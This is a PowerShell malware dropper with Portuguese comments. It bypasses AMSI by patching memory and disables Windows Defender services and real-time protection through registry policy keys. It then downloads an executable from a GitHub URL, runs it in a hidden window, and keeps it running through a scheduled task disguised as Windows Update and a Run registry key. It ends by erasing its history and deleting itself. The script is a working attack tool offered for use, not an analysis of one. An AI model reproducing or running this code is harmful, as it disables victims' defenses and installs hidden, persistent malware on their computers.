# --- CONFIGURAÇÕES FILE.IO ---
$Url_Malware = "https://github.com/thzinxa6/Instalation/raw/refs/heads/main/win_sys_manager.exe"
$Dir = "$env:APPDATA\Local\Microsoft\Windows\SystemCache"
$FileName = "win_sys_manager.exe"
$Path = "$Dir\$FileName"

# 1. AMSI BYPASS (PATCH EM MEMÓRIA)
$A = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$B = $A.GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static')
$C = $B.GetValue($null)
[Runtime.InteropServices.Marshal]::WriteInt64($C, 0x0) 2>$null

# 2. ATAQUE PROFUNDO AO DEFENDER (PÓS-REBOOT)
# Isso impede que o serviço inicie mesmo que o usuário tente ativar manualmente
try {
    # Desativa os serviços no Registro (Start 4 = Desativado)
    $DefenderServices = @("Windefend", "Sense", "WdNisSvc", "WdNisDrv", "WinHttpAutoProxySvc")
    foreach ($service in $DefenderServices) {
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\$service" -Name "Start" -Value 4 -ErrorAction SilentlyContinue
    }

    # Bloqueia o acesso à interface do Defender (GPO)
    $GPOPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
    if (!(Test-Path $GPOPath)) { New-Item -Path $GPOPath -Force | Out-Null }
    Set-ItemProperty -Path $GPOPath -Name "DisableAntiSpyware" -Value 1
    Set-ItemProperty -Path "$GPOPath\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1
} catch {}

# 3. DOWNLOAD DO EXECUTÁVEL
if (!(Test-Path $Dir)) { New-Item -Path $Dir -ItemType Directory -Force | Out-Null }
if (!(Test-Path $Path)) {
    try {
        Invoke-WebRequest -Uri $Url_Malware -OutFile $Path -UseBasicParsing -ErrorAction SilentlyContinue
        Unblock-File -Path $Path -ErrorAction SilentlyContinue
    } catch { exit }
}

# 4. EXECUÇÃO
if (Test-Path $Path) {
    $ProcName = [System.IO.Path]::GetFileNameWithoutExtension($FileName)
    if (!(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)) {
        Start-Process -FilePath $Path -WindowStyle Hidden
    }
}

# 5. PERSISTÊNCIA DUPLA (MULTIPLE VECTORS)
$TName = "WindowsUpdateMaintenance"

# Vetor A: Tarefa Agendada como SYSTEM (Roda no logon)
$Action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c start /min $Path"
$Trigger = New-ScheduledTaskTrigger -AtLogOn
$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName $TName -Action $Action -Trigger $Trigger -Principal $Principal -Force | Out-Null

# Vetor B: Chave de Registro 'Run' (Persistência secundária caso a tarefa seja deletada)
$RunKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $RunKey -Name "WindowsSystemManager" -Value $Path

# 6. AUTO-DESTRUIÇÃO E LIMPEZA
Clear-History
if (Test-Path $PSCommandPath) { Remove-Item -Path "$PSCommandPath" -Force }